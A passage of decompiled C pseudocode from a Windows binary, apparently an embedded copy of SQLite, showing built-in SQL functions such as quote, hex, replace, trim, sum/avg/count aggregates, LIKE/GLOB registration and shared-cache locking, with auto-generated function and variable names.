  result = sub_1005A3FE(0, a1 + 8, -1, a20100105153036, 1);
  if ( result == 18 )
    return sub_10053178(a1);
  return result;
}

//----- (100680F0) --------------------------------------------------------
void __cdecl sub_100680F0(int a1, int a2, int *a3)
{
  int v3; // ecx
  int v4; // eax
  int v5; // esi
  int v6; // eax
  _BYTE *v7; // edi
  int v8; // ecx
  _BYTE *v9; // eax
  _BYTE *v10; // eax
  _BYTE *v11; // eax
  _BYTE *v12; // esi
  char v13; // cl
  int v14; // eax
  unsigned int v15; // edi
  unsigned int v16; // et0
  _BYTE *v17; // eax
  int v18; // ecx
  int v19; // ecx
  int v20; // [esp+10h] [ebp-8h]
  unsigned int v21; // [esp+14h] [ebp-4h]

  v3 = *a3;
  v4 = *(unsigned __int8 *)(*a3 + 30);
  if ( !*(_BYTE *)(*a3 + 30) )
  {
LABEL_24:
    if ( sub_1005A3FE(0, a1 + 8, 4, aNull_2, 1) == 18 )
      sub_10053178(a1);
    return;
  }
  if ( *(unsigned __int8 *)(*a3 + 30) <= 2u )
  {
    sub_1005A394((_WORD *)*a3, a1 + 8);
    return;
  }
  if ( v4 != 3 )
  {
    if ( v4 == 4 )
    {
      v20 = sub_100530A3(v3);
      v5 = sub_1005AA64(*a3);
      v6 = sub_10067A76(a1, 2 * (v5 + 2i64));
      v7 = (_BYTE *)v6;
      if ( v6 )
      {
        v8 = 0;
        if ( v5 > 0 )
        {
          v9 = (_BYTE *)(v6 + 3);
          do
          {
            *(v9 - 1) = byte_100FEC24[*(unsigned __int8 *)(v8 + v20) >> 4];
            *v9 = byte_100FEC24[*(_BYTE *)(v8 + v20) & 0xF];
            ++v8;
            v9 += 2;
          }
          while ( v8 < v5 );
        }
        v10 = &v7[2 * v5];
        v10[2] = 39;
        v10[3] = 0;
        *v7 = 88;
        v7[1] = 39;
        sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, -1, a1, v7, 1);
        sub_10058E74((int)v7);
      }
      return;
    }
    goto LABEL_24;
  }
  v11 = (_BYTE *)sub_100530C6(v3);
  v12 = v11;
  if ( v11 )
  {
    v13 = *v11;
    v14 = 0;
    v15 = 0;
    v21 = 0;
    while ( v13 )
    {
      if ( v13 == 39 )
      {
        v16 = (__PAIR64__(v21, v15++) + 1) >> 32;
        v21 = v16;
      }
      v13 = v12[++v14];
    }
    v17 = (_BYTE *)sub_10067A76(a1, __PAIR64__(v21, v15) + v14 + 3);
    if ( v17 )
    {
      *v17 = 39;
      v18 = 1;
      while ( *v12 )
      {
        v17[v18++] = *v12;
        if ( *v12 == 39 )
          v17[v18++] = 39;
        ++v12;
      }
      v17[v18] = 39;
      v19 = v18 + 1;
      v17[v19] = 0;
      sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, v19, a1, v17, 1);
    }
  }
}

//----- (10068289) --------------------------------------------------------
_BYTE *__cdecl sub_10068289(int a1, int a2, int *a3)
{
  _BYTE *v3; // edi
  int v4; // esi
  _BYTE *result; // eax
  _BYTE *v6; // edx
  int v7; // ecx
  _BYTE *v8; // edx
  int v9; // [esp+Ch] [ebp-4h]

  v3 = (_BYTE *)sub_100530A3(*a3);
  v4 = sub_1005AA64(*a3);
  result = (_BYTE *)sub_10067A76(a1, 2i64 * v4 + 1);
  v6 = result;
  if ( result )
  {
    if ( v4 > 0 )
    {
      v9 = v4;
      do
      {
        v7 = *v3 & 0xF;
        *v6 = byte_100FEC24[(unsigned __int8)*v3 >> 4];
        v8 = v6 + 1;
        *v8 = byte_100FEC24[v7];
        v6 = v8 + 1;
        ++v3;
        --v9;
      }
      while ( v9 );
    }
    *v6 = 0;
    return (_BYTE *)sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, 2 * v4, a1, result, 1);
  }
  return result;
}

//----- (10068317) --------------------------------------------------------
void *__cdecl sub_10068317(int a1, int a2, int *a3)
{
  int *v3; // edi
  int v4; // edi
  int v5; // esi
  unsigned int v6; // edx
  void *result; // eax
  int v8; // [esp+4h] [ebp-8h]
  int savedregs; // [esp+Ch] [ebp+0h]

  v4 = *(_DWORD *)(a1 + 24);
  v5 = sub_1005A03A(*a3);
  if ( __SPAIR64__(v6, v5) > *(int *)(v4 + 72) )
    return (void *)sub_10053178(a1);
  savedregs = v8;
  v3 = (int *)(a1 + 8);
  sub_10059FC7((int *)(a1 + 8));
  *(_DWORD *)(a1 + 32) = 0;
  *(_WORD *)(a1 + 36) = 16;
  *(_BYTE *)(a1 + 38) = 4;
  if ( v5 < 0 )
    v5 = 0;
  *v3 = v5;
  *(_BYTE *)(a1 + 39) = 1;
  sub_10059D49(v5, (int)v3, 0);
  result = *(void **)(a1 + 28);
  if ( result )
  {
    *(_DWORD *)(a1 + 32) = v5;
    return memset(result, 0, v5);
  }
  return result;
}
// 1006833D: variable 'v6' is possibly undefined
// 1005A236: variable 'v8' is possibly undefined

//----- (10068358) --------------------------------------------------------
void __cdecl sub_10068358(int a1, int a2, int *a3)
{
  int v3; // edi
  _BYTE *v4; // eax
  _BYTE *v5; // esi
  bool v6; // sf
  int v7; // edi
  int v8; // edi
  int v9; // eax
  _BYTE *v10; // ebx
  int v11; // edi
  int v12; // [esp+10h] [ebp-30h]
  int Size; // [esp+14h] [ebp-2Ch]
  int v14; // [esp+18h] [ebp-28h]
  int v15; // [esp+1Ch] [ebp-24h]
  int v16; // [esp+20h] [ebp-20h]
  _BYTE *Buf2; // [esp+24h] [ebp-1Ch]
  void *Src; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  unsigned int v20; // [esp+30h] [ebp-10h]
  int v21; // [esp+34h] [ebp-Ch]
  __int64 v22; // [esp+38h] [ebp-8h]

  v16 = sub_100530C6(*a3);
  if ( v16 )
  {
    v3 = sub_1005AA64(*a3);
    v21 = v3;
    v4 = (_BYTE *)sub_100530C6(a3[1]);
    Buf2 = v4;
    if ( v4 )
    {
      if ( !*v4 )
      {
        sub_1005A394((_WORD *)*a3, a1 + 8);
        return;
      }
      Size = sub_1005AA64(a3[1]);
      Src = (void *)sub_100530C6(a3[2]);
      if ( Src )
      {
        v14 = sub_1005AA64(a3[2]);
        v22 = v3 + 1;
        v5 = (_BYTE *)sub_10067A76(a1, v22);
        if ( v5 )
        {
          v7 = v3 - Size;
          v6 = v7 < 0;
          v19 = v7;
          v8 = 0;
          v9 = 0;
          v12 = 0;
          if ( !v6 )
          {
            do
            {
              v10 = (_BYTE *)(v9 + v16);
              if ( *(_BYTE *)(v9 + v16) == *Buf2 && !memcmp(v10, Buf2, Size) )
              {
                v15 = *(_DWORD *)(a1 + 24);
                v22 += v14 - Size;
                if ( v22 - 1 > *(int *)(v15 + 72) )
                {
                  sub_10053178(a1);
                  sub_10058EC7(v15, (unsigned int)v5);
                  return;
                }
                v20 = (unsigned int)v5;
                if ( sub_1005387F(v8, (int)v5) || (v5 = (_BYTE *)sub_10058EFA(v22, (int)v5)) == 0 )
                {
                  sub_10053198(a1);
                  sub_10058EC7(v15, v20);
                  return;
                }
                memcpy(&v5[v8], Src, v14);
                v8 += v14;
                v12 = v12 + Size - 1;
              }
              else
              {
                v5[v8++] = *v10;
              }
              v9 = ++v12;
            }
            while ( v12 <= v19 );
          }
          memcpy(&v5[v8], (const void *)(v16 + v9), v21 - v9);
          v11 = v21 - v12 + v8;
          v5[v11] = 0;
          sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, v11, a1, v5, 1);
        }
      }
    }
  }
}

//----- (10068550) --------------------------------------------------------
unsigned __int8 *__cdecl sub_10068550(int a1, int a2, int *a3)
{
  unsigned __int8 *result; // eax
  int v4; // ebx
  char **v5; // esi
  char *v6; // edi
  int v7; // ebx
  unsigned __int8 v8; // cl
  unsigned __int8 *v9; // ecx
  char *v10; // eax
  unsigned __int8 v11; // dl
  int i; // edi
  signed int v13; // eax
  int j; // edi
  signed int v15; // eax
  int v16; // [esp+10h] [ebp-18h]
  unsigned __int8 *Buf1; // [esp+14h] [ebp-14h]
  unsigned __int8 *v18; // [esp+18h] [ebp-10h]
  unsigned __int8 *v19; // [esp+1Ch] [ebp-Ch]
  signed int v20; // [esp+20h] [ebp-8h]
  int v21; // [esp+24h] [ebp-4h]
  signed int v22; // [esp+24h] [ebp-4h]

  result = (unsigned __int8 *)*a3;
  if ( *(_BYTE *)(*a3 + 30) != 5 )
  {
    result = (unsigned __int8 *)sub_100530C6(*a3);
    Buf1 = result;
    if ( result )
    {
      v4 = 1;
      v16 = sub_1005AA64(*a3);
      if ( a2 == 1 )
      {
        v19 = 0;
        v18 = (unsigned __int8 *)&unk_100FC45A;
        v5 = &off_100FEC34;
      }
      else
      {
        result = (unsigned __int8 *)sub_100530C6(a3[1]);
        v6 = (char *)result;
        v19 = result;
        if ( !result )
          return result;
        v7 = 0;
        if ( !*result )
          return (unsigned __int8 *)sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v16, a1, Buf1, 1);
        do
        {
          v8 = *result++;
          if ( v8 >= 0xC0u )
          {
            while ( (*result & 0xC0) == 0x80 )
              ++result;
          }
          ++v7;
        }
        while ( *result );
        if ( v7 <= 0 )
          return (unsigned __int8 *)sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v16, a1, Buf1, 1);
        result = (unsigned __int8 *)sub_10067A76(a1, 5i64 * v7);
        v5 = (char **)result;
        if ( !result )
          return result;
        v9 = &result[4 * v7];
        v4 = 0;
        v18 = v9;
        v10 = v6;
        if ( !*v6 )
          return (unsigned __int8 *)sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v16, a1, Buf1, 1);
        do
        {
          v5[v4] = v10;
          v11 = *v10++;
          if ( v11 >= 0xC0u )
          {
            while ( (*v10 & 0xC0) == 0x80 )
              ++v10;
          }
          v9[v4] = (_BYTE)v10 - LOBYTE(v5[v4]);
          ++v4;
        }
        while ( *v10 );
        if ( v4 <= 0 )
          return (unsigned __int8 *)sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v16, a1, Buf1, 1);
      }
      v21 = *(_DWORD *)(*(_DWORD *)a1 + 4);
      if ( (v21 & 1) != 0 )
      {
        while ( v16 > 0 )
        {
          for ( i = 0; i < v4; ++i )
          {
            v13 = v18[i];
            v20 = v13;
            if ( v13 <= v16 && !memcmp(Buf1, v5[i], v13) )
              break;
          }
          if ( i >= v4 )
            break;
          Buf1 += v20;
          v16 -= v20;
        }
      }
      if ( (v21 & 2) != 0 && v16 > 0 )
      {
        do
        {
          for ( j = 0; j < v4; ++j )
          {
            v15 = v18[j];
            v22 = v15;
            if ( v15 <= v16 && !memcmp(&Buf1[v16 - v15], v5[j], v15) )
              break;
          }
          if ( j >= v4 )
            break;
          v16 -= v22;
        }
        while ( v16 > 0 );
      }
      if ( v19 )
        sub_10058E74((int)v5);
      return (unsigned __int8 *)sub_100530EC((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v16, a1, Buf1, 1);
    }
  }
  return result;
}
// 10068667: conditional instruction was optimized away because ebx.4>=1
// 100686BD: conditional instruction was optimized away because ebx.4>=1
// 100FEC34: using guessed type char *off_100FEC34;

//----- (10068731) --------------------------------------------------------
void __cdecl sub_10068731(_DWORD *a1, int a2, int *a3)
{
  int v3; // eax
  int v4; // edi
  int v5; // ebx
  int v6; // eax
  int v7; // esi
  __int64 v8; // rax
  bool v9; // zf
  __int64 v10; // kr00_8
  int v11; // edi
  double v12; // st7
  int v13; // [esp+18h] [ebp-8h]

  v3 = sub_1005336A(a1, 32);
  v4 = *a3;
  v5 = v3;
  sub_1005C78F(*a3);
  sub_1005C69B(v4);
  v6 = *(unsigned __int8 *)(v4 + 30);
  if ( v5 && v6 != 5 )
  {
    ++*(_QWORD *)(v5 + 16);
    v7 = *a3;
    if ( v6 == 1 )
    {
      LODWORD(v8) = sub_1005A03A(v7);
      v9 = *(_WORD *)(v5 + 24) == 0;
      *(double *)v5 = (double)v8 + *(double *)v5;
      if ( v9 )
      {
        v10 = v8 + *(_QWORD *)(v5 + 8);
        v13 = v8 + *(_DWORD *)(v5 + 8);
        v11 = *(int *)(v5 + 12) >> 31;
        *(_DWORD *)(v5 + 12) = HIDWORD(v10);
        *(_BYTE *)(v5 + 24) = (v11 & (SHIDWORD(v8) >> 31) & ~(SHIDWORD(v10) >> 31) | (SHIDWORD(v10) >> 31) & ~v11 & ~(SHIDWORD(v8) >> 31)) != 0;
        *(_DWORD *)(v5 + 8) = v13;
      }
    }
    else
    {
      v12 = sub_1005A0AF(v7) + *(double *)v5;
      *(_BYTE *)(v5 + 25) = 1;
      *(double *)v5 = v12;
    }
  }
}
// 10068792: variable 'v8' is possibly undefined

//----- (10068806) --------------------------------------------------------
__int16 __cdecl sub_10068806(_DWORD *a1)
{
  int v1; // eax

  v1 = sub_1005336A(a1, 0);
  if ( v1 && *(__int64 *)(v1 + 16) > 0 )
  {
    if ( *(_BYTE *)(v1 + 24) )
    {
      LOWORD(v1) = sub_1005312B((int)a1, aIntegerOverflo_0);
    }
    else if ( *(_BYTE *)(v1 + 25) )
    {
      LOWORD(v1) = sub_1005310E((int)a1, *(double *)v1);
    }
    else
    {
      LOWORD(v1) = sub_1005315D((int)a1, *(_DWORD *)(v1 + 8), *(_DWORD *)(v1 + 12));
    }
  }
  return v1;
}

//----- (10068867) --------------------------------------------------------
__int16 __cdecl sub_10068867(_DWORD *a1)
{
  int v1; // eax

  v1 = sub_1005336A(a1, 0);
  if ( v1 && *(__int64 *)(v1 + 16) > 0 )
    LOWORD(v1) = sub_1005310E((int)a1, *(double *)v1 / (double)*(__int64 *)(v1 + 16));
  return v1;
}

//----- (100688B1) --------------------------------------------------------
__int16 __cdecl sub_100688B1(_DWORD *a1)
{
  double *v1; // eax
  double v2; // st7

  v1 = (double *)sub_1005336A(a1, 0);
  if ( v1 )
    v2 = *v1;
  else
    v2 = 0.0;
  return sub_1005310E((int)a1, v2);
}

//----- (100688E1) --------------------------------------------------------
_QWORD *__cdecl sub_100688E1(_DWORD *a1, int a2, int a3)
{
  _QWORD *result; // eax

  result = (_QWORD *)sub_1005336A(a1, 8);
  if ( !a2 || *(_BYTE *)(*(_DWORD *)a3 + 30) != 5 )
  {
    if ( result )
      ++*result;
  }
  return result;
}

//----- (1006890F) --------------------------------------------------------
int __cdecl sub_1006890F(_DWORD *a1)
{
  int *v1; // eax
  int v2; // ecx
  int v3; // eax

  v1 = (int *)sub_1005336A(a1, 0);
  if ( v1 )
  {
    v2 = *v1;
    v3 = v1[1];
  }
  else
  {
    v2 = 0;
    v3 = 0;
  }
  return sub_1005315D((int)a1, v2, v3);
}

//----- (10068941) --------------------------------------------------------
int __cdecl sub_10068941(_DWORD *a1, int a2, int *a3)
{
  int result; // eax
  _WORD *v4; // ebx
  bool v5; // zf
  int v6; // edi
  BOOL v7; // esi
  int v8; // [esp+14h] [ebp+10h]

  result = (int)a3;
  v4 = (_WORD *)*a3;
  v5 = *(_BYTE *)(*a3 + 30) == 5;
  v8 = *a3;
  if ( !v5 )
  {
    result = sub_1005336A(a1, 40);
    v6 = result;
    if ( result )
    {
      if ( *(_WORD *)(result + 28) )
      {
        v7 = *(_DWORD *)(*a1 + 4) != 0;
        result = sub_1005A556(result, a1[14], v8);
        if ( v7 )
        {
          if ( result >= 0 )
            return result;
        }
        else if ( result <= 0 )
        {
          return result;
        }
        v4 = (_WORD *)v8;
      }
      return sub_1005A394(v4, v6);
    }
  }
  return result;
}

//----- (100689A4) --------------------------------------------------------
int *__cdecl sub_100689A4(_DWORD *a1)
{
  int *result; // eax
  int *v2; // ebx

  result = (int *)sub_1005336A(a1, 0);
  v2 = result;
  if ( result )
  {
    if ( *((_WORD *)result + 14) )
      sub_1005A394(result, (int)(a1 + 2));
    return (int *)sub_10059FC7(v2);
  }
  return result;
}

//----- (100689D4) --------------------------------------------------------
void __cdecl sub_100689D4(_DWORD *a1, int a2, int *a3)
{
  int v3; // edi
  int v4; // eax
  bool v5; // zf
  int v6; // eax
  int v7; // eax
  char *v8; // [esp+Ch] [ebp-4h]
  _BYTE *v9; // [esp+Ch] [ebp-4h]

  if ( *(_BYTE *)(*a3 + 30) != 5 )
  {
    v3 = sub_1005336A(a1, 28);
    if ( v3 )
    {
      v4 = a1[6];
      v5 = *(_BYTE *)(v3 + 25) == 0;
      *(_BYTE *)(v3 + 25) = 1;
      *(_DWORD *)(v3 + 20) = *(_DWORD *)(v4 + 72);
      if ( !v5 )
      {
        if ( a2 == 2 )
        {
          v8 = (char *)sub_100530C6(a3[1]);
          v6 = sub_1005AA64(a3[1]);
        }
        else
        {
          v8 = asc_10181644;
          v6 = 1;
        }
        sub_100552D1(v6, v3, v8);
      }
      v9 = (_BYTE *)sub_100530C6(*a3);
      v7 = sub_1005AA64(*a3);
      sub_100552D1(v7, v3, v9);
    }
  }
}

//----- (10068A69) --------------------------------------------------------
int __cdecl sub_10068A69(_DWORD *a1)
{
  int result; // eax
  _BYTE *v2; // eax

  result = sub_1005336A(a1, 0);
  if ( result )
  {
    if ( *(_BYTE *)(result + 26) )
    {
      return sub_10053178((int)a1);
    }
    else if ( *(_BYTE *)(result + 24) )
    {
      return sub_10053198((int)a1);
    }
    else
    {
      v2 = (_BYTE *)sub_1005539C(result);
      return sub_100530EC((void (__cdecl *)(int, unsigned int))sub_10058E74, -1, (int)a1, v2, 1);
    }
  }
  return result;
}

//----- (10068AB6) --------------------------------------------------------
int __usercall sub_10068AB6@<eax>(int a1@<esi>)
{
  int result; // eax

  sub_10054017((_DWORD *)a1, (unsigned __int8 *)aSqliteRenameTa, 2, 1, 0, (int)sub_10074E1D, 0, 0);
  sub_10054017((_DWORD *)a1, (unsigned __int8 *)aSqliteRenameTr, 2, 1, 0, (int)sub_10074FEB, 0, 0);
  result = sub_10054017((_DWORD *)a1, (unsigned __int8 *)aSqliteRenamePa, 3, 1, 0, (int)sub_10074EB0, 0, 0);
  if ( !*(_BYTE *)(a1 + 30) )
  {
    result = sub_10054151((_DWORD *)a1);
    if ( result == 7 )
      *(_BYTE *)(a1 + 30) = 1;
  }
  return result;
}

//----- (10068B1B) --------------------------------------------------------
_DWORD *__cdecl sub_10068B1B(int a1, unsigned __int8 *Src, char a3)
{
  _BYTE *v3; // eax
  _DWORD *result; // eax

  v3 = sub_10059297(Src);
  result = sub_100697AC((size_t)v3, 2, a1, Src, 1, 0);
  if ( result )
    *((_BYTE *)result + 3) = a3;
  return result;
}

//----- (10068B49) --------------------------------------------------------
_DWORD *__usercall sub_10068B49@<eax>(_DWORD *a1@<ebx>, int a2)
{
  void *v3; // [esp+8h] [ebp-4h]

  v3 = &unk_100FEC20;
  if ( !a2 )
    v3 = &unk_100FEC1C;
  sub_10054017(a1, (unsigned __int8 *)aLike, 2, 5, (int)v3, (int)sub_10067FB3, 0, 0);
  sub_10054017(a1, (unsigned __int8 *)aLike_0, 3, 5, (int)v3, (int)sub_10067FB3, 0, 0);
  sub_10054017(a1, (unsigned __int8 *)aGlob, 2, 5, (int)&unk_100FEC18, (int)sub_10067FB3, 0, 0);
  sub_10068B1B((int)a1, (unsigned __int8 *)aGlob_0, 3);
  return sub_10068B1B((int)a1, (unsigned __int8 *)aLike_1, 2 * (a2 != 0) + 1);
}

//----- (10068BD7) --------------------------------------------------------
_DWORD *sub_10068BD7()
{
  char *v0; // esi
  char *v1; // esi
  _DWORD *result; // eax

  v0 = (char *)&unk_10181818;
  do
  {
    sub_10069759((int)v0, (int)&unk_10194F20);
    v0 += 32;
  }
  while ( (int)v0 < (int)&unk_10181DF8 );
  v1 = (char *)&unk_10180288;
  do
  {
    result = sub_10069759((int)v1, (int)&unk_10194F20);
    v1 += 32;
  }
  while ( (int)v1 < (int)off_10180388 );
  return result;
}
// 10180388: using guessed type int (*off_10180388[2])();

//----- (10068C0F) --------------------------------------------------------
int __usercall sub_10068C0F@<eax>(int a1@<esi>)
{
  int result; // eax

  sub_10061305(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 48));
  result = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(result + 4) = *(_DWORD *)a1;
  *(_BYTE *)(a1 + 10) = 1;
  return result;
}

//----- (10068C28) --------------------------------------------------------
int __usercall sub_10068C28@<eax>(int a1@<esi>)
{
  int result; // eax

  result = sub_10061317(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 48));
  *(_BYTE *)(a1 + 10) = 0;
  return result;
}

//----- (10068C39) --------------------------------------------------------
void __usercall sub_10068C39(int a1@<edi>)
{
  int v1; // eax
  int i; // esi
  int j; // esi

  if ( *(_BYTE *)(a1 + 9) )
  {
    ++*(_DWORD *)(a1 + 12);
    if ( !*(_BYTE *)(a1 + 10) )
    {
      if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 48) )
        v1 = dword_10182194(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 48));
      else
        v1 = 0;
      if ( v1 )
      {
        for ( i = *(_DWORD *)(a1 + 20); i; i = *(_DWORD *)(i + 20) )
        {
          if ( *(_BYTE *)(i + 10) )
            sub_10068C28(i);
        }
        sub_10068C0F(a1);
        for ( j = *(_DWORD *)(a1 + 20); j; j = *(_DWORD *)(j + 20) )
        {
          if ( *(_DWORD *)(j + 12) )
            sub_10068C0F(j);
        }
      }
      else
      {
        *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) = *(_DWORD *)a1;
        *(_BYTE *)(a1 + 10) = 1;
      }
    }
  }
}
// 10182194: using guessed type int (__cdecl *dword_10182194)(_DWORD);

//----- (10068CA7) --------------------------------------------------------
int __usercall sub_10068CA7@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)(result + 9) )
  {
    if ( (*(_DWORD *)(result + 12))-- == 1 )
      return sub_10068C28(result);
  }
  return result;
}

//----- (10068CBC) --------------------------------------------------------
int __cdecl sub_10068CBC(int a1)
{
  int result; // eax
  int v2; // edi
  int i; // esi
  int v4; // [esp+4h] [ebp-8h]
  int v5; // [esp+8h] [ebp-4h]

  result = a1;
  v4 = 0;
  if ( *(int *)(a1 + 4) > 0 )
  {
    v5 = 0;
    do
    {
      v2 = *(_DWORD *)(*(_DWORD *)(result + 8) + v5 + 4);
      if ( v2 )
      {
        if ( *(_BYTE *)(v2 + 9) )
        {
          ++*(_DWORD *)(v2 + 12);
          if ( !*(_BYTE *)(v2 + 10) )
          {
            while ( *(_DWORD *)(v2 + 24) )
              v2 = *(_DWORD *)(v2 + 24);
            while ( *(_BYTE *)(v2 + 10) && *(_DWORD *)(v2 + 20) )
              v2 = *(_DWORD *)(v2 + 20);
            for ( i = *(_DWORD *)(v2 + 20); i; i = *(_DWORD *)(i + 20) )
            {
              if ( *(_BYTE *)(i + 10) )
                sub_10068C28(i);
            }
            do
            {
              sub_10068C0F(v2);
              v2 = *(_DWORD *)(v2 + 20);
            }
            while ( v2 );
            result = a1;
          }
        }
      }
      ++v4;
      v5 += 16;
    }
    while ( v4 < *(_DWORD *)(result + 4) );
  }
  return result;
}

//----- (10068D45) --------------------------------------------------------
int __usercall sub_10068D45@<eax>(int a1@<edi>)
{
  int v1; // ebx
  int v2; // esi
  int result; // eax
  int i; // [esp+4h] [ebp-4h]

  v1 = 0;
  for ( i = 0; i < *(_DWORD *)(a1 + 4); v1 += 16 )
  {
    v2 = *(_DWORD *)(*(_DWORD *)(a1 + 8) + v1 + 4);
    if ( v2 && *(_BYTE *)(v2 + 9) && (*(_DWORD *)(v2 + 12))-- == 1 )
      sub_10068C28(v2);
    result = ++i;
  }
  return result;
}

//----- (10068D82) --------------------------------------------------------
int *__usercall sub_10068D82@<eax>(int *result@<eax>, int a2@<esi>)
{
  int v2; // edx
  int v3; // ecx
  _DWORD *v4; // [esp+0h] [ebp-4h]

  v2 = 0;
  if ( a2 && *(_BYTE *)(a2 + 9) )
  {
    v3 = *result;
    if ( *result <= 0 )
    {
LABEL_7:
      result[v3 + 1] = a2;
    }
    else
    {
      v4 = result + 1;
      while ( *(_DWORD *)(*v4 + 4) <= *(_DWORD *)(a2 + 4) )
      {
        ++v4;
        if ( ++v2 >= v3 )
          goto LABEL_7;
      }
      while ( v3 > v2 )
      {
        result[v3 + 1] = result[v3];
        --v3;
      }
      result[v2 + 1] = a2;
    }
    ++*result;
  }
  return result;
}

//----- (10068DD3) --------------------------------------------------------
int __usercall sub_10068DD3@<eax>(int *a1@<edi>)
{
  int *v1; // ebx
  int v2; // esi
  int result; // eax
  int v5; // [esp+0h] [ebp-4h]

  v5 = 0;
  if ( *a1 > 0 )
  {
    v1 = a1 + 1;
    do
    {
      v2 = *v1;
      if ( (*(_DWORD *)(*v1 + 12))-- == 1 )
        sub_10068C28(v2);
      result = ++v5;
      ++v1;
    }
    while ( v5 < *a1 );
  }
  return result;
}

//----- (10068E02) --------------------------------------------------------
void __usercall sub_10068E02(_DWORD *a1@<esi>)
{
  _DWORD *v1; // edi
  bool i; // zf
  _DWORD *v3; // ebx
  int v4; // [esp-4h] [ebp-Ch]

  v1 = (_DWORD *)a1[2];
  v4 = a1[3];
  a1[2] = 0;
  sub_10058E74(v4);
  a1[3] = 0;
  *a1 = 0;
  for ( i = v1 == 0; !i; i = v3 == 0 )
  {
    v3 = (_DWORD *)*v1;
    sub_10058E74((int)v1);
    v1 = v3;
  }
  a1[1] = 0;
}

//----- (10068E33) --------------------------------------------------------
int __cdecl sub_10068E33(int a1)
{
  unsigned __int8 *v1; // ecx
  int result; // eax

  for ( result = 0; a1 > 0; --a1 )
    result ^= (8 * result) ^ (unsigned __int8)byte_100FEEC0[*v1++];
  return result;
}
// 10068E3E: variable 'v1' is possibly undefined

//----- (10068E5E) --------------------------------------------------------
_DWORD *__usercall sub_10068E5E@<eax>(_DWORD *result@<eax>, _DWORD *a2@<edx>, int a3@<esi>)
{
  int v3; // ecx
  _DWORD *v4; // edx
  int v5; // ecx

  if ( a2 )
  {
    if ( *a2 )
      v3 = a2[1];
    else
      v3 = 0;
    ++*a2;
    a2[1] = result;
  }
  else
  {
    v3 = 0;
  }
  if ( v3 )
  {
    *result = v3;
    result[1] = *(_DWORD *)(v3 + 4);
    v4 = *(_DWORD **)(v3 + 4);
    if ( v4 )
      *v4 = result;
    else
      *(_DWORD *)(a3 + 8) = result;
    *(_DWORD *)(v3 + 4) = result;
  }
  else
  {
    *result = *(_DWORD *)(a3 + 8);
    v5 = *(_DWORD *)(a3 + 8);
    if ( v5 )
      *(_DWORD *)(v5 + 4) = result;
    result[1] = 0;
    *(_DWORD *)(a3 + 8) = result;
  }
  return result;
}

//----- (10068EB0) --------------------------------------------------------
int __usercall sub_10068EB0@<eax>(int a1@<eax>, unsigned int *a2@<ecx>)
{
  int v2; // edi
  _DWORD *v5; // edi
  unsigned int v6; // ebx
  _DWORD *v7; // edi
  unsigned int v8; // eax
  _DWORD *v9; // [esp+10h] [ebp-8h]
  _DWORD *v10; // [esp+14h] [ebp-4h]

  v2 = a1;
  if ( (unsigned int)(8 * a1) > 0x400 )
    v2 = 128;
  if ( v2 == *a2 )
    return 0;
  sub_10069106();
  v5 = (_DWORD *)sub_10058C4C(8 * v2);
  v10 = v5;
  sub_10069112();
  if ( !v5 )
    return 0;
  sub_10058E74(a2[3]);
  a2[3] = (unsigned int)v5;
  v6 = (unsigned int)dword_1018216C(v5) >> 3;
  *a2 = v6;
  memset(v5, 0, 8 * v6);
  v7 = (_DWORD *)a2[2];
  a2[2] = 0;
  while ( v7 )
  {
    v9 = (_DWORD *)*v7;
    v8 = sub_10068E33(v7[4]);
    sub_10068E5E(v7, &v10[2 * (v8 % v6)], (int)a2);
    v7 = v9;
  }
  return 1;
}
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);

//----- (10068F5C) --------------------------------------------------------
int **__usercall sub_10068F5C@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, unsigned __int8 *a3, int a4)
{
  int v4; // eax
  int *v5; // eax
  int **v6; // esi
  int v7; // edi

  v4 = a1[3];
  if ( v4 )
  {
    v5 = (int *)(v4 + 8 * a4);
    v6 = (int **)v5[1];
    v7 = *v5;
  }
  else
  {
    v6 = (int **)a1[2];
    v7 = a1[1];
  }
  while ( 1 )
  {
    if ( !v7 )
      return 0;
    --v7;
    if ( !v6 )
      return 0;
    if ( v6[4] == (int *)a2 && !sub_100593F9(v6[3], a2, a3) )
      break;
    v6 = (int **)*v6;
  }
  return v6;
}

//----- (10068FA8) --------------------------------------------------------
void __usercall sub_10068FA8(_DWORD *a1@<eax>, _DWORD *a2@<ecx>, int a3)
{
  _DWORD *v4; // ecx
  int v5; // ecx
  _DWORD *v6; // ecx

  v4 = (_DWORD *)a1[1];
  if ( v4 )
    *v4 = *a1;
  else
    a2[2] = *a1;
  if ( *a1 )
    *(_DWORD *)(*a1 + 4) = a1[1];
  v5 = a2[3];
  if ( v5 )
  {
    v6 = (_DWORD *)(v5 + 8 * a3);
    if ( (_DWORD *)v6[1] == a1 )
      v6[1] = *a1;
    --*v6;
  }
  sub_10058E74((int)a1);
  if ( a2[1]-- == 1 )
    sub_10068E02(a2);
}

//----- (10068FF9) --------------------------------------------------------
int *__usercall sub_10068FF9@<eax>(int a1@<eax>, _DWORD *a2@<esi>, unsigned __int8 *a3)
{
  int v4; // edx
  int **v5; // eax

  if ( a2[3] )
    v4 = (unsigned int)sub_10068E33(a1) % *a2;
  else
    v4 = 0;
  v5 = sub_10068F5C(a2, a1, a3, v4);
  if ( v5 )
    return v5[2];
  else
    return 0;
}

//----- (10069032) --------------------------------------------------------
int *__usercall sub_10069032@<eax>(unsigned int *a1@<eax>, unsigned __int8 *a2@<edi>, int a3, int *a4)
{
  unsigned int v5; // ebx
  int **v6; // eax
  int *v7; // ebx
  _DWORD *v9; // eax
  _DWORD *v10; // ebx
  unsigned int v11; // eax
